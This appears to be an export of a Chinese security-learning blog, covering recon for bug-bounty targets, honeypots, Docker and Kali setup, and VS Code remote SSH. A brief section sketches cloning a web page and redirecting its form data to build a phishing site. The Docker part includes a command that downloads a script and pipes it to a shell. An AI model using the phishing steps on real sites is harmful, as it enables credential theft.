<h3><span id="案例四src">案例四：SRC</span></h3><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240719163841161.png" alt="image-20240719163841161"></p>
<p>对应的从补天平台找个src，并对应收集漏洞， 以某游戏公司为例，在外围开始打点。看返回包，当然对应这种上好防护器的实战类案例，并非有那么简单。使很难做到像前面几个案例那样一眼中间件的。</p>
<p><strong>同时对于这种src网站，显然也不可能是CMS开源的，不过对源码的获取也是有方法的，哪怕获取不到也有黑盒测试，资源监控等办法，类似的也可以对开发团进行一些所谓的社工，比如在某些开发论坛上看看相关开发人员有没有把某些代码往网上一堆这种可能性</strong></p>
]]></content>
      <categories>
        <category>Penetration Testing Basic</category>
      </categories>
      <tags>
        <tag>pr0gram</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/07/15/%E4%BB%8E7%E5%BC%80%E5%A7%8B%E7%9A%84%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1><span id="如读者有未授权渗透行为后果自负本站仅作学习用途">如读者有未授权渗透行为，后果自负，本站仅作学习用途</span></h1><h1><span id="day7信息打点-资产泄露ampcms识别ampgit监控ampsvnampds_storeamp备份">Day7:信息打点-资产泄露&amp;CMS识别&amp;Git监控&amp;SVN&amp;DS_Store&amp;备份</span></h1><p> 对一个网站的敏感信息获取，对应的如果该网站把一些返回头屏蔽不让我们获取到它的源码组成，那这该怎么办。</p>
<p>Tag1：“</p>
<p>直接获取： 直接获取是通过CMS直接识别，对应的就是直接利用<a href="https://www.yunsee.cn/">云悉互联网WEB资产在线梳理|在线CMS指纹识别平台 - 云悉安全平台 (yunsee.cn)</a></p>
<p>输入对应的url和ip,就可以开始查询对应的指纹信息，对应的可以搜索程序名，直接进入代码审计阶段。</p>
]]></content>
      <categories>
        <category>Penetration Testing Basic</category>
      </categories>
      <tags>
        <tag>pr0gram</tag>
      </tags>
  </entry>
  <entry>
    <title>更底层更方便的一些部署</title>
    <url>/2024/07/09/vscode%E5%92%8Chtml%EF%BC%8Cjavascript%E5%92%8CDocker/</url>
    <content><![CDATA[<p>WARNING ：<strong>请先有一定的linux命令基础再接触并进行部署</strong></p>
<h1><span id="what-is-蜜罐">WHAT IS 蜜罐</span></h1><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240512091639288.png" alt="image-20240512091639288"></p>
<p>蜜罐是一种安全威胁的主动防御技术，<strong>它通过模拟一个或多个易受攻击的主机或服务来吸引攻击者，捕获攻击流量与样本，发现网络威胁、提取威胁特征，</strong>蜜罐的价值在于被探测、攻陷。其在本质上来说，<strong>是一个与攻击者进行攻防博弈的过程。</strong>蜜罐提供服务，攻击者提供访问，通过蜜罐对攻击者的吸引，攻击者对蜜罐进行攻击，在攻击的过程中，有经验的攻击者也可能识别出目标是一个蜜罐。为此，<strong>为更好的吸引攻击者，蜜罐也需要提供强悍的攻击诱骗能力。</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240512092050232.png" alt="image-20240512092050232"></p>
<h1><span id="web服务中间件"><strong>Web服务中间件</strong></span></h1><p>类似Apache  Tomcat  Nginx将用户的HTTP请求解析，并返回到浏览器</p>
<h1><span id="钓鱼网站制作">钓鱼网站制作</span></h1><p>ctrl+s保存当前全部静态网页 并本地部署</p>
<p><strong>开始测试 打开本地网站发包</strong> </p>
<p>观察自身请求 <strong>可以发送请求后打开F12</strong></p>
<p>然后<strong>点击network并观察对应路径名–即可知请求发向文件</strong></p>
<p><strong>全局检索对应路径 然后直接替换接收数据文件</strong></p>
<h1><span id="javascript">Javascript</span></h1><p><a href="https://www.runoob.com/js/js-tutorial.html">JavaScript 教程 | 菜鸟教程 (runoob.com)</a></p>
<p>不会就查就行了</p>
<h1><span id="docker">Docker</span></h1><p><a href="https://docker-practice.github.io/zh-cn/">前言 · Docker – 从入门到实践 (docker-practice.github.io)</a></p>
<p>Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任意一个搭载windows或者linux的机器上</p>
<p><strong>也可以实现虚拟化，容器完全使用沙箱机制，相互之间并无接口</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240525111213269.png" alt="image-20240525111213269"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240525111358970.png" alt="image-20240525111358970"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240525111550258.png" alt="image-20240525111550258"></p>
<h2><span id="更新kali-apt源">更新kali apt源</span></h2><p>编辑 &#x2F;etc&#x2F;apt&#x2F;sources.list 文件， 在文件最前面添加以下条目：</p>
<p>**#**<strong>中科大稳定版分支</strong> <strong>Kali</strong> <strong>源</strong> </p>
<p>deb <a href="https://mirrors.ustc.edu.cn/kali">https://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free non-free-firmware contrib</p>
<p>deb-src <a href="https://mirrors.ustc.edu.cn/kali">https://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free non-free-firmware contrib</p>
<p>sudo nano &#x2F;etc&#x2F;apt&#x2F;sources.list</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/12790161/1716608995166-e9089a93-d685-4257-bb94-0822a054dd55.png" alt="img"></p>
<p>sudo apt update</p>
<h2><span id="linux安装docker">Linux安装docker</span></h2><p>以kali 2024.1 为例，安装docker</p>
<h3><span id="添加使用-https-传输的软件包以及-ca-证书">添加使用 HTTPS 传输的软件包以及 CA 证书</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install \</span><br><span class="line">     apt-transport-https \</span><br><span class="line">     ca-certificates \</span><br><span class="line">     curl \</span><br><span class="line">     gnupg \</span><br><span class="line">     lsb-release</span><br></pre></td></tr></table></figure>

<h3><span id="添加软件源的-gpg-密钥">添加软件源的 GPG 密钥</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/debian/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure>

<h3><span id="sourceslist-中添加-docker-软件源">sources.list 中添加 Docker 软件源</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://mirrors.aliyun.com/docker-ce/linux/debian \</span></span><br><span class="line"><span class="string">  buster stable&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure>

<h3><span id="安装">安装</span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>

<p>如果无需体验最新版的docker，也可以直接执行下面命令安装</p>
<p>apt install docker.io</p>
<h3><span id="参考">参考</span></h3><p><a href="https://docker-practice.github.io/zh-cn/install/debian.html">https://docker-practice.github.io/zh-cn/install/debian.html</a></p>
<h3><span id="docker部署"><strong>Docker部署</strong></span></h3><p><a href="https://hub.docker.com/?_gl=1*1k7v6iz*_ga*MTg4MjkxMTk4MS4xNzE2NjA3NDU1*_ga_XJWPQMJYHQ*MTcxNjYxODY3OC4yLjEuMTcxNjYxODY5Ni40Mi4wLjA.">Dockerhub</a></p>
<h2><span id="docker命令">Docker命令</span></h2><h4><span id="三件套"><strong>三件套</strong></span></h4><p>docker search 寻找想要的镜像 同时可以标签筛选</p>
<p>docker pull 拉取想要的镜像</p>
<p>docker run 运行镜像</p>
<p>docker stop {container id}</p>
<p><strong>查看对应容器信息</strong></p>
<p>docker ps </p>
<p><em>里面就有包含</em></p>
<h4><span id="删除对应镜像">删除对应镜像</span></h4><p>docker rmi {container id}</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240525144321937.png" alt="image-20240525144321937"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240525151120882.png" alt="image-20240525151120882"></p>
<p><a href="https://www.runoob.com/docker/docker-command-manual.html">Docker 命令大全 | 菜鸟教程 (runoob.com)</a></p>
<p><strong>创建镜像后能做什么</strong> <strong>镜像的特性是什么</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240529201943078.png" alt="image-20240529201943078"></p>
<h1><span id="vs-code-remote-ssh-远程控制windows主机-免密登录-内网穿透">VS Code Remote-ssh 远程控制Windows主机 + 免密登录 + 内网穿透</span></h1><h2><span id="vs-code-remote-ssh-远程控制windows主机-免密登录-内网穿透">VS Code Remote-ssh 远程控制Windows主机 + 免密登录 + 内网穿透</span></h2><p>1 我们为什么需要远程连接服务器？（使用需求+场景）<br>炼丹的研究生：在我们炼丹过程中，经常需要连接远程的服务器（通常是实验室的服务器）进行炼丹。通常情况下，我们会使用Pycharm的远程开发功能，同步服务器与本地的项目文件，使用远程解释器进行开发。但是使用过的同学都知道，重量级的Pycharm每次远程同步、加载远程解释器都需要相当长的时间。如果我们想要随时切换工位、宿舍、家里的各个场景，Pycharm的同步、加载就成了一场噩梦。特别是当我们的python环境安装了很多依赖包，项目生成了大量文件的时候更是这样。<strong>直到VS Code推出了Remote Development开发包，便完全解决了这个问题。让我可以在不同的场景快速切换，无需等待同步文件、环境。</strong>因为VS Code远程开发完全是运行在服务器上的，我们本地的VS Code只是一个前端界面，所以<strong>根本无需同步服务器上的文件</strong>、解释器依赖库就可以体验到与本地开发完全相同的体验。在远程连接服务器后，只需要使用可以随身携带的笔记本进行Coding，而炼丹就交由服务器来完成。优雅！<br>2 远程办公：<strong>将自己的台式机当成一个服务器在服务器上训练&#x2F;测试模型。这样自己远程办公时，可以通过ssh远程连接到自己的台式机在公司开会时，用笔记本远程连接自己的台式机</strong><br>3 以上只是列举出来的一些常见的使用场景，但具体到每个人都是不尽相同的，但是需求都是相似的——优化我们的工作流。</p>
<h2><span id="为什么需要内网穿透">为什么需要内网穿透？</span></h2><p>通常<strong>服务器是在一个局域网下的，没有公网ip，需要通过局域网内的NAT</strong>（Network Address Translation）讲局域网内的私有IP地址转换为公网IP才能正常通信。如果想要远程连接，要么和服务器处在同一个局域网下，但这通常限制了我们使用场景，如果离开这个局域网，就没法远程开发了。因此需要内网穿透，解决处于使用了NAT设备的私有TCP&#x2F;IP网络中的主机之间建立连接的问题。但是如果你有公网IP，就没有这么多b事了。但是99%的可能你都没有公网IP，其中的原因也比较简单，公网IP地址是一种稀缺的有限的资源，而Internet是老美搞的，简单讲有人多了，就一定会有人少了，就得通各种各样的方式来提高我们为数不多的公网IP地址的利用率，以满足我国人民日益增长的上网需求doge。<br>什么是内网穿透？<br>内网穿透是一种网络技术，它允许在私有局域网（内网）中的设备或服务可以通过公共网络（如互联网）进行访问。通常情况下，内网设备由于NAT 设备屏蔽或防火墙等网络设备所保护，无法直接从公网访问。通过使用内网穿透技术，可以建立起公网和内网之间的通道，使得外部用户可以通过公网连接到内网中的设备，就像这些设备直接连接在公网上一样。内网穿透简单来说就是<strong>将内网外网通过隧道打通,让内网的数据让外网可以获取</strong>。</p>
<h3><span id="什么是ssh">什么是SSH？</span></h3><p>安全外壳协议（Secure Shell Protocol，简称SSH）<strong>是一种运行在应用层的（默认端口号为22）加密的网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境。</strong>SSH通过在网络中建立安全隧道来实现SSH客户端与服务器之间的连接。最早的时候，互联网通信都是明文通信，一旦被截获，内容就暴露无疑。SSH最常见的用途是远程登录系统，人们通常利用SSH来传输命令行界面和远程执行命令。SSH使用频率最高的场合是类Unix系统，但是Windows操作系统也能有限度地使用SSH。<strong>2015年，微软宣布将在未来的操作系统中提供原生SSH协议支持，Windows 10 1803版本已提供OpenSSH工具。</strong><br>SSH以非对称加密实现身份验证。身份验证有多种途径：</p>
<p>其中一种方法是使用自<strong>动生成的公钥-私钥对来简单地加密网络连接，随后使用密码认证进行登录</strong>；<br>另一种方法是<strong>人工生成一对公钥和私钥，通过生成的密钥进行认证，这样就可以在不输入密码的情况下登录。任何人都可以自行生成密钥。</strong>公钥需要放在待访问的电脑之中，而对应的私钥需要由用户自行保管。认证过程基于生成出来的私钥，但整个认证过程中私钥本身不会传输到网络中。其中公钥用于让对方加密信息，而自己的私钥可以解密经过自己公钥加密后的信息，这就是非对称加密。</p>
<p>SSH以非对称加密实现身份验证。身份验证有多种途径：</p>
<p>其中一种方法是使用自动生成的公钥-私钥对来简单地加密网络连接，随后使用密码认证进行登录；<br>另一种方法是人工生成一对公钥和私钥，通过生成的密钥进行认证，这样就可以在不输入密码的情况下登录。任何人都可以自行生成密钥。公钥需要放在待访问的电脑之中，而对应的私钥需要由用户自行保管。认证过程基于生成出来的私钥，但整个认证过程中私钥本身不会传输到网络中。其中公钥用于让对方加密信息，而自己的私钥可以解密经过自己公钥加密后的信息，这就是非对称加密。</p>
<h3><span id="ssh远程连接之后能干什么">SSH远程连接之后能干什么？</span></h3><p>SSH远程连接之后，就可以像操作本地的机器一样操作远程机器。当需要操控的机器不在本地时就可以使用ssh协议远程连接操控。</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240606153525709.png" alt="image-20240606153525709"></p>
<p><strong>在Powershell（管理员）中确保添加了防火墙规则</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在Powershell（管理员）中确保添加了防火墙规则</span><br><span class="line"></span><br><span class="line"># 启动sshd服务</span><br><span class="line">Start-Service sshd</span><br><span class="line"></span><br><span class="line"># 将sshd服务设置为自动启动，若不设置需要在每次重启后重新开启sshd</span><br><span class="line">Set-Service -Name sshd -StartupType &#x27;Automatic&#x27;</span><br><span class="line"></span><br><span class="line"># 确认防火墙规则，一般在安装时会配置好</span><br><span class="line">Get-NetFirewallRule -Name *ssh*</span><br><span class="line"></span><br><span class="line"># 若安装时未添加防火墙规则&quot;OpenSSH-Server-In-TCP&quot;，则通过以下命令添加</span><br><span class="line">New-NetFirewallRule -Name sshd -DisplayName &#x27;OpenSSH Server (sshd)&#x27; -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第二步：连接到 OpenSSH 服务器<br><strong>在第一次连接之前，我们先来了解两个概念</strong>：<strong>username和servername&#x2F;hostname。在windows的SSH服务器中也就是在你的远程主机中</strong></p>
<p>username可以用你激活电脑时使用的用户名，即文件资源管理器中C:\Users\username的username。<br>而servername则是“设置”&gt;“系统”&gt;“关于”里的“设备名称”<br>其中输入密码应该是你的远程主机的开机密码，并且这一次连接应该确保是在同一网络下进行的，因为我们并没有进行内网穿透操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240606154856346.png" alt="image-20240606154856346"></p>
<p><strong>如果你成果的看到了以下输出，恭喜你成功的连接上了你的远程主机，并且已经成功了一大半了。接下来我们去VS Code中连接，操作都是类似的。</strong></p>
<h3><span id="在vs-code中连接你的远程主机">在VS Code中连接你的远程主机</span></h3><p>这部分内容遵循VS Code的官方教程，但在此基础上做了精简，官方教程写的好的部分会直接贴出来。这一次的连接同样应该确保是在同一网络下进行的，因为我们并没有进行内网穿透操作。<br><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240606155050660.png" alt="image-20240606155050660"></p>
<h1><span id="vscode远程连接docker">Vscode远程连接<strong>Docker</strong></span></h1><p>Author ：探姬</p>
<p>原文于语雀发布，地址为：<a href="https://www.yuque.com/probius/cs_wp/fegz0w">https://www.yuque.com/probius/cs_wp/fegz0w</a></p>
<p>本文也有配套视频，建议结合食用：(给个三连吧www)</p>
<p><a href="https://www.bilibili.com/video/BV1684y1z7L6">https://www.bilibili.com/video/BV1684y1z7L6</a></p>
<h2><span id="about">About</span></h2><p>本文档完整的流程可以帮助您在<strong>Kali Linux</strong>上完成Docker环境，并且基于Vscode的Remote功能，利用SSH协议，构建 VSCODE + SSH + Docker 的工作流，提高效率。</p>
<p>同样，本文档也考虑了非Kali，用于开发&#x2F;生产环境的 <strong>Ubuntu &#x2F; Debian</strong> 系统 ，如果您想要在开发&#x2F;生产中使用该工作流，可以直接从<strong>Get Docker</strong> 或者 <strong>Build SSH＋vscode + docker Workflow</strong> 章节开始。</p>
<p>笔者水平有限，错误疏漏之处在所难免，烦请各位师傅斧正。</p>
<p>以及非常感谢 <strong>陈橘墨(@<strong>Randark_JMT</strong>)师傅</strong>提供的帮助。</p>
<h2><span id="get-kali">Get Kali</span></h2><h3><span id="download">Download</span></h3><p>在Kali官网下载即可，建议直接下载封装好的虚拟机版本：</p>
<p><a href="https://www.kali.org/get-kali/#kali-virtual-machines">https://www.kali.org/get-kali/#kali-virtual-machines</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665941610725-938968ad-7947-4e8b-9030-e3758268b763.png" alt="img"></p>
<p>解压下载好的压缩包到您想要放置虚拟机的位置，然后双击配置文件直接打开自动添加，或者在VMware中手动添加：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665941724211-28de32c3-f423-4a93-9834-e73779c30df1.png" alt="img"></p>
<p>添加完成后，启动即可：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665941756080-5769f591-f33d-4acb-bc6d-d3e6b05d214f.png" alt="img"></p>
<p>（当然，作为DockerRuner，您可能需要设置一个稍微大点的内存值）</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665941814497-37c98101-8d6b-4c1d-80c1-a63fc7952de8.png" alt="img"></p>
<h3><span id="changeresource">ChangeResource？</span></h3><p>笔者并不建议换源，Kali官方源的速度还是不错的，换源可能会导致您软件管理出现问题。</p>
<h1><span id="虚拟机迁移发现远程连接消失">虚拟机迁移发现远程连接消失?</span></h1><p>VM虚拟机移动后IP修改，要做一些什么操作，就可以在自己电脑上使用了<br>第一步：我们打开虚拟机<br>你要在虚拟机文件的里面打开你创建保存的虚拟机文件：</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240609004828634.png" alt="image-20240609004828634"></p>
<p>打开后是这样的：</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240609004907612.png" alt="image-20240609004907612"></p>
<p>你可以打开并且允许虚拟机了，但是他就是连不上xshell，这个是问题是你的那个虚拟编辑器上面的网关和xshell之前的网关不一样，所以他就连接不上。<br>打开虚拟编辑器</p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240609004921035.png" alt="image-20240609004921035"><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240609004934951.png" alt="image-20240609004934951"></p>
<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240609004955897.png" alt="image-20240609004955897"></p>
<p>看看上面箭头的有没有钩选上。其中将主机虚拟机适配器连接到网络和使用本地DHCP必须选择上，不然你的虚拟机就是另外一个问题。</p>
<p>记住自己的子网ip:192.168.xxx.xxx</p>
<p>我们先:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 dhclient  自己获取IP的一个命令</span><br><span class="line">2 然后 ip add</span><br><span class="line">3 查看自动获取的ip地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240609005029453.png" alt="image-20240609005029453"></p>
<p>我们输入下面这个可以修改网关的ip的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 vi /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240609005049558.png" alt="image-20240609005049558"></p>
<p>上这个图片是和7有个参考，如果你是拷贝其他人的虚拟机，就改那个IPADDR就行，因为，其他的别人都改好的。</p>
<p>IPPADDR，我们最好改成我们刚刚ip add 自动获取的那个ip.</p>
<p>改好后我们保存退出：</p>
<p>按esc wq保存退出：</p>
<p>下面我们开始重新启动网卡：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 systemctl restart network.service</span><br><span class="line">2 如果这个命令不行就用：service network restart 重新启动网关</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>重新启动后面，我们就再</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 ip add</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>后面，我试试虚拟机连接网络：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>







<h2><span id="get-docker">Get Docker</span></h2><h3><span id="install">Install</span></h3><p>docker安装目前有两个版本，一个是官方的<strong>docker.ce</strong>版本，一个是有Debian团队维护的<strong>docker.io</strong>版本。</p>
<p>之前有争议说 docker.io 是旧版本的docker 而新版的docker是 dockers.ce</p>
<p>然而docker.io的版本有时会比docker.ce高，事实上，两者只是负责维护的组织不同，前者是Debian官方维护，后者则为Docker官方维护，并没后新旧之分：</p>
<p><a href="https://stackoverflow.com/questions/45023363/what-is-docker-io-in-relation-to-docker-ce-and-docker-ee-now-called-mirantis-k">https://stackoverflow.com/questions/45023363/what-is-docker-io-in-relation-to-docker-ce-and-docker-ee-now-called-mirantis-k</a></p>
<h4><span id="dockerio">docker.io</span></h4><p>该版本由Debian团队维护，采用 apt 的方式管理依赖</p>
<p>安装过程：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665991778767-3780c1b4-c778-4896-b0eb-70651e627778.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665991813089-2477e73a-9650-4eae-b3b4-0f338801b331.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665991905446-84b04c96-1d8d-46b7-a569-945ed7041921.png" alt="img"></p>
<h4><span id="dockerce">docker.ce</span></h4><p> 由docker官方维护的版本，采用 go 的方式管理依赖，如果您要在开发&#x2F;生产环境中使用docker，推荐使用该版本。</p>
<p>如果您的Linux版本为Ubuntu&#x2F;Debian，可以使用一下命令自动安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -qO- https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure>

<p>（注意，Docker并不支持Kali一键安装，同样笔者也不推荐您用kali作为开发生产环境，Kali满足日常需要，使用io版本即可，当然您也可以使用.ce版本的手动安装）</p>
<p>手动安装：</p>
<p>可以参考Docker官方的 Docker Engine安装步骤：</p>
<p><a href="https://docs.docker.com/engine/install/debian/">https://docs.docker.com/engine/install/debian/</a></p>
<p>但是该步骤在 Kali Linux上面可能会存在一定问题，以Kali为例，完整的按照流程如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666080331410-5ec0dec8-2032-404b-82a4-ae31e0ad436d.png" alt="img"></p>
<p>选项选择Yes就好。</p>
<p>然后按照官网提示，添加Docker官方的 GPG key：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/apt/keyrings</span><br><span class="line">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br></pre></td></tr></table></figure>

<p>然后设置仓库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=<span class="subst">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure>

<p>然后开始安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>

<p>随后，如果您是Kali Linux，您可能会遭遇以下报错：</p>
<p><a href="https://unix.stackexchange.com/questions/630643/how-to-install-docker-ce-in-kali-linux">How to install docker-ce in kali-linux?</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666080964792-ad4bf959-2049-4979-9924-48c11bc2641d.png" alt="img"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666080978683-d1a1900c-fea3-4134-b2cb-98ed2d2c5a42.png" alt="img"></p>
<p>这是由于Docker官方并没有提供直接支持Kali的源，所以我们使用Debian的源就好：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%s\n&quot;</span> <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/debian buster stable&quot;</span> |\</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker-ce.list</span><br></pre></td></tr></table></figure>

<p>并且添加对应的密钥：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>

<p>注意不要忘了给密钥相应权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> a+r /etc/apt/keyrings/docker.gpg</span><br></pre></td></tr></table></figure>

<p>此时再跑一次 <code>sudo apt-get update</code>:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>

<p>您可能会遇到一个找不到的源，这个是正常的。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666081542730-3abaa686-0c14-4ee9-835b-c9244e7a601c.png" alt="img"></p>
<p>接下来安装docker：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>

<p>就能正常获取了：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666081606647-ba60b180-36d3-4d71-9696-63ff6fb0068f.png" alt="img"></p>
<p>安装完成后，执行hello-world，得到图示则安装成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1666083076099-29da6da2-2c69-4862-a93b-0d343b5e78f7.png" alt="img"></p>
<h3><span id="dockerhub">DockerHub</span></h3><p><a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
<p>尝试登录您的<code>**DockerHub**</code>账号：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665992062442-9121927b-e352-4d24-8494-e073942e856a.png" alt="img"></p>
<p>如果出现类似错误，请手动配置DNS：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/resolv.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665992104653-95449c6a-2e19-49a3-8ccc-f57ecf3b0b93.png" alt="img"></p>
<p>保存，再次尝试即可成功登录：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665992136237-ce188b31-9008-4375-95ef-f06d4ac013a7.png" alt="img"></p>
<h2><span id="build-sshvscode-docker-workflow">Build SSH＋vscode + docker Workflow</span></h2><p>该步骤适用于支持SSH协议的Linux（废话，哪个Linux没有个SSH），除了在本地的Kali或者其他Linux上面构建，也支持远程构建该工作流。</p>
<h3><span id="start-ssh-service">Start SSH Service</span></h3><h4><span id="kali-linux">Kali Linux</span></h4><p>Kali虚拟机默认是没有开启ssh服务的 （ssh状态：<code>/etc/init.d/ssh status</code>）</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665992570893-88f65a45-ca5e-4295-a9fb-932fc2f9db2f.png" alt="img"></p>
<p>所以需要手动启动一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/ssh start </span><br></pre></td></tr></table></figure>

<p>当然，为了方便，我们将ssh添加到开机自启中：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-rc.d ssh <span class="built_in">enable</span></span><br><span class="line"><span class="comment"># Or use:</span></span><br><span class="line">systemctl <span class="built_in">enable</span> ssh.service</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/21803058/1665992653697-a499a2eb-da24-435e-87f3-4fda32a2669d.png" alt="img"></p>
<p>启动之后就可以开始后面的步骤了。</p>
<h4><span id="ubuntu">Ubuntu</span></h4><p>由于ubuntu默认不自带openssh-server，所以这里需要手动安装。</p>
<p>安装openssh-server：</p>
